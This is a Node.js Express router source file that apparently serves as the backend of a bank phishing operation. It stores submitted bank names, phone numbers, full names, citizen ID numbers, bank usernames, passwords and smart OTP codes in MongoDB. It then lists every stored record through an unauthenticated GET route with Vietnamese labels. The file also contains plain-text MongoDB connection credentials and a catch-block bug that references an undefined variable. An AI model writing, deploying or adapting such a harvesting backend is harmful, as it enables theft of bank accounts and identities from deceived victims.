var express = require('express');
var router = express.Router();
var mongoose = require('mongoose');
var moment = require('moment');

// const uri = "mongodb+srv://portal:portal@cluster0.h9szmnf.mongodb.net/?retryWrites=true&w=majority";
const uri = "mongodb+srv://portal:portal@portal-cluster.cbrxhvd.mongodb.net/?retryWrites=true&w=majority";

const functionConnect = async () => {
  try {
    await mongoose.connect(uri)
    console.log("connected!");
  } catch (error) {
    console.error(error);
  }
}

functionConnect()

// SCHEMA
let userSchema = mongoose.Schema({
  bankName: {
    type: String,
  },
  phone: {
    type: String,
  },
  fullName: {
    type: String,
  },
  citizenId: {
    type: String,
  },
  userName: {
    type: String,
  },
  password: {
    type: String,
  },
  smartOtp: {
    type: String,
  },
  createdAt: {
    type: String,
  },
  updatedAt: {
    type: String,
  },
});

let UserModel = mongoose.model('users', userSchema);

//MODEL

// const { MongoClient } = require("mongodb");

// const uri =
//   "mongodb+srv://tech:tech123@cluster0.sn37e.mongodb.net/?retryWrites=true&w=majority";
// const client = new MongoClient(uri);

// client.connect();
// console.log("connected!");

// const db = client.db("portal");
// const coll = db.collection("users");


router.post("/create", async (req, res, next) => {
  try {
    let body = req.body

    body.createdAt = moment().format('DD/MM/YYYY hh:mm:ss')
    body.updatedAt = moment().format('DD/MM/YYYY hh:mm:ss')
    await UserModel.create(body)
      .then((result) => {
        res.status(200).send(result);
        // res.status(200).json({ messages: "create success", status: "200" })
      })
      .catch((err) => {
        res.status(400).send({
          message: err.message || "Error occurred while creating the user",
        });
        // res.status(400).json({ messages: "created failure", status: "400" })
      })
  } catch (error) {
    console.log('---------error----------', error);
    res.status(400).send({
      message: err.message || "Error occurred while creating the user",
    });
    // res.status(400).json({ error, messages: "created failure", status: "400" })
  }
})

router.get("/", async (req, res, next) => {
  try {
    await UserModel.find()
      .then((users) => {

        let result = users.map((user) => {
          let element = {};
          element["Id"] = user.id;
          element["Tên ngân hàng"] = user.bankName;
          element["Số điện thoại"] = user.phone;
          element["Họ và tên"] = user.fullName;
          element["Chứng minh thư / CCCD"] = user.citizenId;
          element["Tên tài khoản"] = user.userName;
          element["Mật khẩu"] = user.password;
          element["Mã otp"] = user.smartOtp;
          element["Ngày tạo"] = user.createdAt;

          return element;
        })

        res.status(200).send(result);
        // res.status(200).json({ result, messages: "get data success", status: "200" })
      })
      .catch((err) => {
        res.status(400).send({
          message: err.message || "get data failure",
        });
        // res.status(400).json({ messages: "get data failure", status: "400" })
      })
  } catch (error) {
    console.log('---------error----------', error);
    res.status(400).send({
      message: err.message || "get data failure",
    });
    // res.status(400).json({ messages: "get data failure", status: "400" })
  }
})

module.exports = router;
